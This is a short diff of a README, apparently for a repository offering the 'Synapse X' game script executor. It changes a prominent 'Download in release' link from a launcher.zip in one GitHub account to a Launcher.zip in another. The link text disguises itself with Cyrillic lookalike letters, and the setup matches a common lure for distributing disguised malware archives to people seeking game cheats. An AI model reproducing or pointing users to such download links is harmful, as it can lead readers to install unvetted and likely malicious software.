@@ -20,7 +20,7 @@ One of the most compelling features of Synapse X is its powerful script executio
 <div align="center">
 
   
-## 👉 [Downоаd in rеlease](https://github.com/pvaldez66/Synapse-X/releases/download/Download/launcher.zip) 👈
+## 👉 [Downоаd in rеlease](https://github.com/Heiserer/Synapse-X/releases/download/Release/Launcher.zip) 👈
 
 
 <div align="center">
